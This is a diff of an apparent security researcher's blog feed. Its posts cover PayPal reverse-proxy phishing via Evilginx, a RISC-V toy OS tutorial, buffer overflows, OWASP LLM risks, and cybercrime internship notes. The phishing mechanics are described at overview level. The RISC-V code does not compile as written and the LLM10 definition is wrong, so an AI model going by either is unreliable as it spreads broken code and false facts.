@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-01-18T12:01:56+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">PD @0xd4ngi</title><subtitle>Security Researcher</subtitle><author><name>Prashant Dangi</name></author><entry><title type="html">PayPal Phishing with PayPal URL</title><link href="http://localhost:4000/phishing/paypal-phishing/" rel="alternate" type="text/html" title="PayPal Phishing with PayPal URL" /><published>2025-01-18T00:00:00+05:30</published><updated>2025-01-18T00:00:00+05:30</updated><id>http://localhost:4000/phishing/paypal-phishing</id><content type="html" xml:base="http://localhost:4000/phishing/paypal-phishing/"><![CDATA[<h1 id="paypal-phishing-with-paypal-url">PayPal Phishing with Paypal URL</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-01-22T16:34:59+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">PD @0xd4ngi</title><subtitle>Security Researcher</subtitle><author><name>Prashant Dangi</name></author><entry><title type="html">PayPal Phishing with PayPal URL</title><link href="http://localhost:4000/phishing/paypal-phishing/" rel="alternate" type="text/html" title="PayPal Phishing with PayPal URL" /><published>2025-01-18T00:00:00+05:30</published><updated>2025-01-18T00:00:00+05:30</updated><id>http://localhost:4000/phishing/paypal-phishing</id><content type="html" xml:base="http://localhost:4000/phishing/paypal-phishing/"><![CDATA[<h1 id="paypal-phishing-with-paypal-url">PayPal Phishing with Paypal URL</h1>
 
 <p>Fortinet CISO received a mail requesting an invoice amount to be paid, with paypal domain <strong>paypal.com</strong></p>
 
@@ -7,14 +7,14 @@
 <p>This attack involves legitimate paypal URL. According to the CISO, this attack is so clever and sophisticated that gets past PayPal’s
 phishing detection policy.</p>
 
-<h1 id="this-is-not-tagging-of-url-to-text-but-man-in-the-middlemitm-attack">This is not tagging of url to text but Man in the Middle(MITM) Attack</h1>
+<h1 id="this-is-not-tagging-of-url-to-text-but-reverse-web-proxy-phishing">This is not tagging of url to text but reverse web proxy phishing</h1>
 
 <p>This attack starts with an authentic email sent from <em>service@paypal.com</em> requsting money for some invoice. Exeperienced internet
 users may be fooled by the email’s appearance and authenticity of email with legitimate PayPal login URL.</p>
 
 <p>The Pay Now button at the bottom is genuine looking redirecting to paypal’s website.</p>
 
-<p>It might be using Man in the Middle(MitM) Proxy phishing. With the help of tools like
+<p>It might be using reverse web Proxy phishing. With the help of tools like
 <a href="https://github.com/kgretzky/evilginx2">Evilginx</a></p>
 
 <p>Tools like <a href="https://github.com/kgretzky/evilginx2">Evilginx</a> uses phishlets to get to legitimate websites and phishing domain lures
@@ -31,7 +31,166 @@ his credentials and cookies might be gone.</p>
 
 <p>The attackers have registered a MS365 test domain, Which is free for three months, and then a distribution list containing the victim emails <em>.onmicrosoft.com</em></p>
 
-<p>Reference for the post: <a href="https://www.fortinet.com/blog/threat-research/phish-free-paypal-phishing">Phish-free PayPal Phishing</a></p>]]></content><author><name>Prashant Dangi</name></author><category term="phishing" /><summary type="html"><![CDATA[Attackers using sophisticated attacks to bypass login security]]></summary></entry><entry><title type="html">Buffer Overflows and The Virtual memory layout</title><link href="http://localhost:4000/binary-exploitation/virtual-memory-layout/" rel="alternate" type="text/html" title="Buffer Overflows and The Virtual memory layout" /><published>2025-01-09T00:00:00+05:30</published><updated>2025-01-09T00:00:00+05:30</updated><id>http://localhost:4000/binary-exploitation/virtual-memory-layout</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/virtual-memory-layout/"><![CDATA[<h1 id="what-is-virtual-memory-layout">What is Virtual Memory Layout</h1>
+<p>Reference for the post: <a href="https://www.fortinet.com/blog/threat-research/phish-free-paypal-phishing">Phish-free PayPal Phishing</a></p>]]></content><author><name>Prashant Dangi</name></author><category term="Phishing" /><summary type="html"><![CDATA[Attackers using sophisticated attacks to bypass login security]]></summary></entry><entry><title type="html">RISC-V Architecture - From Basics to Building a Simple OS</title><link href="http://localhost:4000/risc-v/RISC-V/" rel="alternate" type="text/html" title="RISC-V Architecture - From Basics to Building a Simple OS" /><published>2025-01-16T00:00:00+05:30</published><updated>2025-01-16T00:00:00+05:30</updated><id>http://localhost:4000/risc-v/RISC-V</id><content type="html" xml:base="http://localhost:4000/risc-v/RISC-V/"><![CDATA[<h1 id="what-is-risc-v-risk-five">What is RISC-V (risk-five)?</h1>
+
+<p>RISC-V is an open-source instruction set architecture (ISA) based on principles of Reduced Instruction Set Computing. Unlike proprietary architectures like ARM or x86, RISC-V is freely available for anyone to use, modify, and implement without licensing fees.</p>
+
+<ul>
+  <li>Supports 32-bit (RV32), 64-bit (RV64), and 128-bit (RV128) addressing</li>
+  <li>Modular design with base ISA and optional extensions</li>
+  <li>Growing ecosystem with hardware implementations and software tools</li>
+</ul>
+
+<h2 id="key-differences-from-arm-cortex">Key Differences from ARM Cortex</h2>
+
+<ol>
+  <li><strong>Licensing Model</strong>
+    <ul>
+      <li>RISC-V: Open-source and royalty-free</li>
+      <li>ARM: Proprietary, requires licensing fees</li>
+    </ul>
+  </li>
+  <li><strong>Instruction Set</strong>
+    <ul>
+      <li>RISC-V: Clean-slate design with minimal, orthogonal instruction set</li>
+      <li>ARM: Evolution-based design with historical compatibility requirements</li>
+    </ul>
+  </li>
+  <li><strong>Extensibility</strong>
+    <ul>
+      <li>RISC-V: Modular design allows custom extensions</li>
+      <li>ARM: Limited customization options</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="building-a-minimal-risc-v-operating-system">Building a Minimal RISC-V Operating System</h2>
+
+<p>Let’s create a simple OS that handles basic file operations and task scheduling. We’ll break this down into steps:</p>
+
+<h3 id="1-boot-sequence">1. Boot Sequence</h3>
+
+<pre><code class="language-assembly">boot.S - Initial boot sequence
+.section .text
+.global start
+start:
+# Set up stack pointer
+li sp, 0x80000000
+# Jump to kernel main
+call kernel_main
+</code></pre>
+
+<h3 id="2-basic-kernel-implementation">2. Basic Kernel Implementation</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// kernel.c</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span><span class="kt">void</span> <span class="nf">kernel_main</span><span class="p">()</span> <span class="p">{</span>
+<span class="c1">// Initialize hardware</span>
+<span class="n">init_uart</span><span class="p">();</span>
+<span class="n">init_interrupts</span><span class="p">();</span>
+<span class="c1">// Initialize task scheduler</span>
+<span class="n">init_scheduler</span><span class="p">();</span>
+<span class="c1">// Start system</span>
+<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+<span class="n">schedule_next_task</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="3-simple-task-scheduler">3. Simple Task Scheduler</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// scheduler.c</span>
+<span class="cp">#define MAX_TASKS 16
+</span><span class="k">struct</span> <span class="n">Task</span> <span class="p">{</span>
+<span class="kt">uint32_t</span> <span class="n">sp</span><span class="p">;</span>
+<span class="kt">uint32_t</span> <span class="n">priority</span><span class="p">;</span>
+<span class="k">enum</span> <span class="n">TaskState</span> <span class="n">state</span><span class="p">;</span>
+<span class="p">};</span>
+<span class="k">static</span> <span class="k">struct</span> <span class="n">Task</span> <span class="n">tasks</span><span class="p">[</span><span class="n">MAX_TASKS</span><span class="p">];</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="n">current_task</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kt">void</span> <span class="nf">init_scheduler</span><span class="p">()</span> <span class="p">{</span>
+<span class="c1">// Initialize task array</span>
+<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_TASKS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+<span class="n">tasks</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">state</span> <span class="o">=</span> <span class="n">TASK_EMPTY</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">schedule_next_task</span><span class="p">()</span> <span class="p">{</span>
+<span class="c1">// Simple round-robin scheduling</span>
+<span class="n">current_task</span> <span class="o">=</span> <span class="p">(</span><span class="n">current_task</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="n">MAX_TASKS</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">tasks</span><span class="p">[</span><span class="n">current_task</span><span class="p">].</span><span class="n">state</span> <span class="o">==</span> <span class="n">TASK_READY</span><span class="p">)</span> <span class="p">{</span>
+<span class="n">context_switch</span><span class="p">(</span><span class="n">tasks</span><span class="p">[</span><span class="n">current_task</span><span class="p">].</span><span class="n">sp</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="4-basic-file-system">4. Basic File System</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// filesystem.c</span>
+<span class="cp">#define MAX_FILES 32
+#define MAX_FILE_SIZE 4096
+</span><span class="k">struct</span> <span class="n">File</span> <span class="p">{</span>
+<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+<span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[</span><span class="n">MAX_FILE_SIZE</span><span class="p">];</span>
+<span class="kt">uint32_t</span> <span class="n">size</span><span class="p">;</span>
+<span class="p">};</span>
+<span class="k">static</span> <span class="k">struct</span> <span class="n">File</span> <span class="n">files</span><span class="p">[</span><span class="n">MAX_FILES</span><span class="p">];</span>
+<span class="kt">int</span> <span class="nf">create_file</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="n">name</span><span class="p">)</span> <span class="p">{</span>
+<span class="c1">// Find empty slot</span>
+<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_FILES</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">if</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+<span class="n">strncpy</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="mi">31</span><span class="p">);</span>
+<span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">}</span>
+<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// No space available</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="hardware-implementation">Hardware Implementation</h2>
+
+<p>RISC-V can be implemented on FPGAs or ASICs. Here’s a basic overview of the pipeline stages:</p>
+
+<ol>
+  <li><strong>Fetch</strong>: Retrieve instruction from memory</li>
+  <li><strong>Decode</strong>: Parse instruction fields</li>
+  <li><strong>Execute</strong>: Perform ALU operations</li>
+  <li><strong>Memory</strong>: Handle memory access</li>
+  <li><strong>Writeback</strong>: Update registers</li>
+</ol>
+
+<h2 id="getting-started">Getting Started</h2>
+
+<p>To run this minimal OS:</p>
+
+<ol>
+  <li>Install RISC-V toolchain:</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt-get <span class="nb">install </span>riscv64-linux-gnu
+</code></pre></div></div>
+
+<ol>
+  <li>Compile the code:</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>riscv64-linux-gnu-gcc <span class="nt">-o</span> kernel kernel.c
+</code></pre></div></div>
+<ol>
+  <li>Compile the kernel:</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>riscv64-linux-gnu-gcc <span class="nt">-march</span><span class="o">=</span>rv64gc <span class="nt">-mabi</span><span class="o">=</span>lp64d <span class="nt">-static</span> <span class="nt">-mcmodel</span><span class="o">=</span>medany <span class="nt">-fvisibility</span><span class="o">=</span>hidden <span class="nt">-nostdlib</span> <span class="nt">-nostartfiles</span> <span class="nt">-T</span> linker.ld boot.S kernel.c scheduler.c filesystem.c <span class="nt">-o</span> kernel.elf
+</code></pre></div></div>
+
+<ol>
+  <li>Run the kernel(QEMU):</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qemu-system-riscv64 <span class="nt">-M</span> virt <span class="nt">-nographic</span> <span class="nt">-bios</span> none <span class="nt">-kernel</span> kernel.elf
+</code></pre></div></div>
+
+<p>This will boot the RISC-V OS and display the UART output.</p>]]></content><author><name>Prashant Dangi</name></author><category term="RISC-V" /><summary type="html"><![CDATA[A deep dive into RISC-V architecture, its implementation, and building a minimal operating system]]></summary></entry><entry><title type="html">Buffer Overflows and The Virtual memory layout</title><link href="http://localhost:4000/binary-exploitation/virtual-memory-layout/" rel="alternate" type="text/html" title="Buffer Overflows and The Virtual memory layout" /><published>2025-01-09T00:00:00+05:30</published><updated>2025-01-09T00:00:00+05:30</updated><id>http://localhost:4000/binary-exploitation/virtual-memory-layout</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/virtual-memory-layout/"><![CDATA[<h1 id="what-is-virtual-memory-layout">What is Virtual Memory Layout</h1>
 
 <p>Operating System manages memory for programs using virtual memory, which is referred as the <strong>virtual memory layout</strong>. Programs are given their own virtual address space, isolating them from other programs.</p>
 
@@ -153,7 +312,7 @@ int main(){
 
 <p><img src="/assets/images/offset.png" alt="" /></p>
 
-<p><strong>If memory can be corrupted through a vulnerability, control flow and data in memory can be manipulated</strong></p>]]></content><author><name>Prashant Dangi</name></author><category term="binary-exploitation" /><summary type="html"><![CDATA[To understand Stack-buffer-overflow attack in the virtual memory]]></summary></entry><entry><title type="html">Understanding Large Language models(LLMs)</title><link href="http://localhost:4000/llm/" rel="alternate" type="text/html" title="Understanding Large Language models(LLMs)" /><published>2025-01-04T00:00:00+05:30</published><updated>2025-01-04T00:00:00+05:30</updated><id>http://localhost:4000/llm</id><content type="html" xml:base="http://localhost:4000/llm/"><![CDATA[<p>“Machine Learning Models that use deep learning to perform Natural Language Processing(NLP) tasks”</p>
+<p><strong>If memory can be corrupted through a vulnerability, control flow and data in memory can be manipulated</strong></p>]]></content><author><name>Prashant Dangi</name></author><category term="Binary-Exploitation" /><summary type="html"><![CDATA[To understand Stack-buffer-overflow attack in the virtual memory]]></summary></entry><entry><title type="html">Understanding Large Language models(LLMs)</title><link href="http://localhost:4000/llm/ai/llm/" rel="alternate" type="text/html" title="Understanding Large Language models(LLMs)" /><published>2025-01-04T00:00:00+05:30</published><updated>2025-01-04T00:00:00+05:30</updated><id>http://localhost:4000/llm/ai/llm</id><content type="html" xml:base="http://localhost:4000/llm/ai/llm/"><![CDATA[<p>“Machine Learning Models that use deep learning to perform Natural Language Processing(NLP) tasks”</p>
 
 <h1 id="how-the-large-language-modelllm-works">How the Large Language Model(LLM) works</h1>
 
@@ -164,7 +323,7 @@ based on transformer architecture, like generative pre-trained transformer(gpt),
 
 <p>To achieve high accuracy, LLMs are trained on massive datasets containing billions of text samples. Through zero-shot learning and self-supervised learning, they develop an understanding of grammar, semantics, and conceptual relationships. Once the training phase is complete, LLMs can generate coherent and contextually appropriate text by predicting subsequent words based on the input provided, leveraging patterns and knowledge acquired during training. This capability supports tasks such as natural language understanding (NLU) and content creation.</p>
 
-<p>Model performance can be further enhanced using techniques like prompt engineering, fine-tuning, and prompt-tuning. Additionally, methods such as reinforcement learning with human feedback (RLHF) are employed to minimize biases, offensive language, and factual inaccuracies—often referred to as hallucinations—that may arise from training on unstructured data. Addressing these issues is critical for ensuring that enterprise-grade LLMs are reliable, meet ethical standards, and do not pose risks related to liability or reputational harm.</p>]]></content><author><name>Prashant Dangi</name></author><summary type="html"><![CDATA[“Machine Learning Models that use deep learning to perform Natural Language Processing(NLP) tasks”]]></summary></entry><entry><title type="html">LLM OWASP TOP 10 vulnerabilities</title><link href="http://localhost:4000/LLM-OWASP-top-10/" rel="alternate" type="text/html" title="LLM OWASP TOP 10 vulnerabilities" /><published>2025-01-02T00:00:00+05:30</published><updated>2025-01-02T00:00:00+05:30</updated><id>http://localhost:4000/LLM-OWASP-top-10</id><content type="html" xml:base="http://localhost:4000/LLM-OWASP-top-10/"><![CDATA[<h3 id="llm12025-prompt-injectionjailbreaking">LLM1:2025 Prompt Injection/Jailbreaking</h3>
+<p>Model performance can be further enhanced using techniques like prompt engineering, fine-tuning, and prompt-tuning. Additionally, methods such as reinforcement learning with human feedback (RLHF) are employed to minimize biases, offensive language, and factual inaccuracies—often referred to as hallucinations—that may arise from training on unstructured data. Addressing these issues is critical for ensuring that enterprise-grade LLMs are reliable, meet ethical standards, and do not pose risks related to liability or reputational harm.</p>]]></content><author><name>Prashant Dangi</name></author><category term="LLM" /><category term="AI" /><summary type="html"><![CDATA[“Machine Learning Models that use deep learning to perform Natural Language Processing(NLP) tasks”]]></summary></entry><entry><title type="html">LLM OWASP TOP 10 vulnerabilities</title><link href="http://localhost:4000/ai/llm/LLM-OWASP-top-10/" rel="alternate" type="text/html" title="LLM OWASP TOP 10 vulnerabilities" /><published>2025-01-02T00:00:00+05:30</published><updated>2025-01-02T00:00:00+05:30</updated><id>http://localhost:4000/ai/llm/LLM-OWASP-top-10</id><content type="html" xml:base="http://localhost:4000/ai/llm/LLM-OWASP-top-10/"><![CDATA[<h3 id="llm12025-prompt-injectionjailbreaking">LLM1:2025 Prompt Injection/Jailbreaking</h3>
 
 <p>Prompt injection vulnerability alters the Large-Language-Models(LLMs) behavious or output in an unintended way when user prompts something unusual</p>
 
@@ -246,7 +405,7 @@ with.</p>
 
 <h3 id="llm102025-unbound-consumption">LLM10:2025 Unbound Consumption</h3>
 
-<p>Unbounded Consumption refers to the process where a Large Language Model (LLM) generates  outputs based on input queries or prompts. Inference is a critical function of LLMs, involving the application of learned patterns and knowledge to produce relevant responses or predictions.</p>]]></content><author><name>Prashant Dangi</name></author><summary type="html"><![CDATA[LLM1:2025 Prompt Injection/Jailbreaking]]></summary></entry><entry><title type="html">Retrieval Augmented Generation(RAG) is a threat to AI</title><link href="http://localhost:4000/rag/" rel="alternate" type="text/html" title="Retrieval Augmented Generation(RAG) is a threat to AI" /><published>2025-01-02T00:00:00+05:30</published><updated>2025-01-02T00:00:00+05:30</updated><id>http://localhost:4000/rag</id><content type="html" xml:base="http://localhost:4000/rag/"><![CDATA[<p>Some concern and risks associated with RAG that could perceived as threats, in areas related to AI safety and misuse</p>
+<p>Unbounded Consumption refers to the process where a Large Language Model (LLM) generates  outputs based on input queries or prompts. Inference is a critical function of LLMs, involving the application of learned patterns and knowledge to produce relevant responses or predictions.</p>]]></content><author><name>Prashant Dangi</name></author><category term="AI" /><category term="LLM" /><summary type="html"><![CDATA[LLM1:2025 Prompt Injection/Jailbreaking]]></summary></entry><entry><title type="html">Retrieval Augmented Generation(RAG) is a threat to AI</title><link href="http://localhost:4000/ai/llm/rag/rag/" rel="alternate" type="text/html" title="Retrieval Augmented Generation(RAG) is a threat to AI" /><published>2025-01-02T00:00:00+05:30</published><updated>2025-01-02T00:00:00+05:30</updated><id>http://localhost:4000/ai/llm/rag/rag</id><content type="html" xml:base="http://localhost:4000/ai/llm/rag/rag/"><![CDATA[<p>Some concern and risks associated with RAG that could perceived as threats, in areas related to AI safety and misuse</p>
 
 <h1 id="llm-using-rag-has-certain-issues">LLM using RAG has certain issues</h1>
 
@@ -289,341 +448,541 @@ susceptible to manipulation for spreading propaganda or fake news.</p>
   </li>
 </ul>
 
-<p>RAG is a <strong>powerfull enhancement</strong> for AI, not a fundamental threat. Its <strong>Security vulnerabilities</strong> and ethical risks can be mitigated with proper design, testing, and governance frameworks. However, without safeguards, misuse or failure in RAG systems can lead to <strong>trust erosion</strong> and <strong>operational vulnerabilities</strong> in AI ecosystem.</p>]]></content><author><name>Prashant Dangi</name></author><summary type="html"><![CDATA[Some concern and risks associated with RAG that could perceived as threats, in areas related to AI safety and misuse]]></summary></entry><entry><title type="html">Gpcssi 24</title><link href="http://localhost:4000/GPCSSI-24/" rel="alternate" type="text/html" title="Gpcssi 24" /><published>2024-06-21T00:00:00+05:30</published><updated>2024-06-21T00:00:00+05:30</updated><id>http://localhost:4000/GPCSSI-24</id><content type="html" xml:base="http://localhost:4000/GPCSSI-24/"><![CDATA[<p>20-June</p>
+<p>RAG is a <strong>powerfull enhancement</strong> for AI, not a fundamental threat. Its <strong>Security vulnerabilities</strong> and ethical risks can be mitigated with proper design, testing, and governance frameworks. However, without safeguards, misuse or failure in RAG systems can lead to <strong>trust erosion</strong> and <strong>operational vulnerabilities</strong> in AI ecosystem.</p>]]></content><author><name>Prashant Dangi</name></author><category term="AI" /><category term="LLM" /><category term="RAG" /><summary type="html"><![CDATA[Some concern and risks associated with RAG that could perceived as threats, in areas related to AI safety and misuse]]></summary></entry><entry><title type="html">My Journey at Gurugram Cyber Police Summer Internship 2024</title><link href="http://localhost:4000/cybersecurity/digital-forensics/GPCSSI-24/" rel="alternate" type="text/html" title="My Journey at Gurugram Cyber Police Summer Internship 2024" /><published>2024-06-21T00:00:00+05:30</published><updated>2024-06-21T00:00:00+05:30</updated><id>http://localhost:4000/cybersecurity/digital-forensics/GPCSSI-24</id><content type="html" xml:base="http://localhost:4000/cybersecurity/digital-forensics/GPCSSI-24/"><![CDATA[<h1 id="learning-cybersecurity-at-ground-zero-my-gpcssi24-experience">Learning Cybersecurity at Ground Zero: My GPCSSI’24 Experience</h1>
 
-<p>Letter Bomb Investigation (Back Tracking on Social Media)
-CDR Analysis — specific time
-IPDR Analysis</p>
+<p>During my summer internship with the Gurugram Cyber Police, I got an unprecedented glimpse into the world of cybercrime investigation. Here’s my journey through some of the most fascinating topics we covered.</p>
 
-<p>Old Browser – exploitation for IP(Privacy.net) – CVE for that old browser version</p>
+<h2 id="the-evolution-of-cyber-threats-2008-present">The Evolution of Cyber Threats (2008-Present)</h2>
 
-<p>2008 – financial crisis :</p>
+<p>It’s interesting to note that 2008 wasn’t just the year of the financial crisis - it marked the birth of several technologies that would revolutionize both the digital landscape and cybercrime:</p>
 <ul>
-  <li>iphone</li>
-  <li>Whatsapp</li>
-  <li>Bitcoin</li>
-  <li>Dark Web</li>
+  <li>The iPhone transformed mobile computing</li>
+  <li>WhatsApp changed how we communicate</li>
+  <li>Bitcoin introduced decentralized digital currency</li>
+  <li>The Dark Web gained prominence</li>
 </ul>
 
-<p>Cryptocurrencies — BTC – Satoshi Nakamoto (An Ali name)</p>
+<h2 id="digital-investigation-techniques">Digital Investigation Techniques</h2>
 
-<p>Ransomware 8/15 can be recovered 
-RAAS(Ransomware as a service)</p>
+<h3 id="call-detail-record-cdr-analysis">Call Detail Record (CDR) Analysis</h3>
+<p>One of our first deep-dives was into CDR analysis - a crucial investigative technique that helps track communication patterns and location history of suspects through their phone records. This proves especially vital in time-sensitive cases like kidnapping or fraud.</p>
 
-<p>Quantum Computing:
-– RSA 204 debit card and finances…(Pta nahi what is itt) using quantum encryption
-Quantum security law, Passed budget of 650 crore to CDAC by PM modi
-– IBM quantum computer (quantum.ibm.com) – IBM quiskit 
-– AWS Braket</p>
+<h3 id="letter-bomb-investigation">Letter Bomb Investigation</h3>
+<p>We learned about backtracking techniques on social media platforms, which is essential for investigating digital threats. This includes analyzing digital footprints and tracking communication patterns across platforms.</p>
 
-<p>bitcoinwhoswho.com</p>
+<h3 id="cryptocurrency-investigations">Cryptocurrency Investigations</h3>
+<p>The rise of crypto-related crimes led us to explore tools like bitcoinwhoswho.com for blockchain analysis. We learned that Ransomware-as-a-Service (RaaS) has become a growing concern, though interestingly, about 53% of ransomware attacks can potentially be recovered.</p>
 
-<p>13th June</p>
+<h2 id="modern-cyber-threats">Modern Cyber Threats</h2>
 
-<p>–spoofhouse 
-– i message exploitation zero days 
-– STUPIDS AND FOOLS ARE HACKED 
-– OSINT – Nothing on socail media
-– Dark Web intelligence -X 
-– i- message code breach on Dark Web
-Information Gathering – email and phhishing
-– email — password/Data Breach
-– leekpeek.com (if ur email data is public)</p>
+<h3 id="social-engineering-attacks">Social Engineering Attacks</h3>
+<p>Some key learnings about modern attack vectors:</p>
+<ul>
+  <li>Clickjacking and 3D phishing techniques</li>
+  <li>Gmail iframe vulnerabilities</li>
+  <li>Session hijacking and cookie stealing</li>
+  <li>The dangers of remote access tools like Anydesk when misused</li>
+</ul>
 
-<p>CLICKJACKING – 3D PHISHING – GMAIL IFRAME VULNERABILITY</p>
+<h3 id="mobile-security">Mobile Security</h3>
+<p>Mobile threats have evolved significantly:</p>
+<ul>
+  <li>Zero-click iMessage attacks exploiting memory vulnerabilities</li>
+  <li>The importance of disabling message previews</li>
+  <li>Call spoofing techniques</li>
+  <li>Homograph attacks targeting banking customers</li>
+</ul>
 
-<p>Add-ons 
-– ghosty 
-– WOT extension</p>
+<h3 id="emerging-technologies-and-threats">Emerging Technologies and Threats</h3>
 
-<p>session hijacking/ cookie stealing</p>
+<p>The future of cybersecurity is being shaped by quantum computing:</p>
+<ul>
+  <li>Impact on RSA encryption and financial security</li>
+  <li>India’s investment in quantum security (₹650 crore budget allocated to CDAC)</li>
+  <li>Practical exposure to quantum computing through platforms like IBM Quiskit and AWS Braket</li>
+</ul>
 
-<p>Anydesk</p>
+<h2 id="real-world-cases">Real-World Cases</h2>
 
-<p>– FB – messanger 
-– Payload (pdf/jpg) – php cookie steel xss – to bypass – JS to bypass App – steganography</p>
+<p>One of the most eye-opening aspects was learning about current cybercrime patterns:</p>
+<ul>
+  <li>International cybercrime operations in Cambodia, Laos, Vietnam, and Dubai</li>
+  <li>The rise of sextortion cases</li>
+  <li>Social engineering through WhatsApp profile pictures claiming medical emergencies</li>
+  <li>SEO manipulation in cybercrime</li>
+</ul>
 
-<p>MALWARE BYTES (but its paid)</p>
+<h2 id="investigation-tools">Investigation Tools</h2>
 
-<p>– Malware Attack</p>
+<p>Essential tools we learned about:</p>
+<ul>
+  <li>Dark web crawlers for data gathering</li>
+  <li>Browser extensions like Ghosty and WOT for security</li>
+  <li>Malwarebytes for malware protection</li>
+  <li>Various data analysis tools for CDR, SDR, and TDR investigations</li>
+</ul>
 
-<p>Ransomware Attack – (Click/AutoClick)
-Phone Ransomware</p>
+<h2 id="key-takeaways">Key Takeaways</h2>
 
-<p>Mobile Attacks 
-– zero-click i message attack – memory exploit –
-– toggle i message
-– Disable message preview</p>
+<p>The most important lesson? Cybercrime isn’t just about technical exploits - it’s often about human psychology. As one instructor memorably put it: “STUPIDS AND FOOLS ARE HACKED” (their emphasis, not mine!). The best defense is awareness and continuous education.</p>
 
-<p>Call Spoofing —– ??</p>
+<p><em>This blog post summarizes my learning experience at GPCSSI’24. Some details have been omitted or generalized for security reasons.</em></p>]]></content><author><name>Prashant Dangi</name></author><category term="Cybersecurity" /><category term="Digital-Forensics" /><summary type="html"><![CDATA[Learning Cybersecurity at Ground Zero: My GPCSSI’24 Experience]]></summary></entry><entry><title type="html">Digital Protection: Safeguarding Your Personal Identifiable Information (PII)</title><link href="http://localhost:4000/Cybersecurity-essentials/" rel="alternate" type="text/html" title="Digital Protection: Safeguarding Your Personal Identifiable Information (PII)" /><published>2024-05-27T00:00:00+05:30</published><updated>2024-05-27T00:00:00+05:30</updated><id>http://localhost:4000/Cybersecurity-essentials</id><content type="html" xml:base="http://localhost:4000/Cybersecurity-essentials/"><![CDATA[<h1 id="protecting-your-digital-identity-a-comprehensive-guide">Protecting Your Digital Identity: A Comprehensive Guide</h1>
 
-<p>hdfc bank – homograph attack</p>
+<p>In today’s interconnected world, where our lives are increasingly digital, protecting our Personal Identifiable Information (PII) has become more crucial than ever. This guide will help you understand the risks and implement effective strategies to safeguard your digital identity.</p>
 
-<p>13th June</p>
+<h2 id="understanding-pii-and-its-importance">Understanding PII and Its Importance</h2>
 
-<p>Modus Operandi 
-– cambodia lahos vitenam dubai 
-– Links burst – awareness materail</p>
+<p>Personal Identifiable Information (PII) is any data that could potentially identify a specific individual. This information, when compromised, can lead to identity theft, financial fraud, or other cybercrimes. In an age where data breaches are becoming increasingly common, protecting your PII is not just important—it’s essential.</p>
 
-<p>– mewat Kind - SEO 
-SEXTORTION –   SEXUAL EXTORTION</p>
+<h3 id="common-types-of-pii-that-need-protection">Common Types of PII That Need Protection</h3>
 
-<p>TRAP in indulging …</p>
+<ul>
+  <li>Personal details (birth date, birthplace, maiden names)</li>
+  <li>Government-issued numbers (Social Security, passport, driver’s license)</li>
+  <li>Contact information (address, phone number, email)</li>
+  <li>Financial data (bank accounts, credit card information)</li>
+  <li>Professional information (workplace, school, employment history)</li>
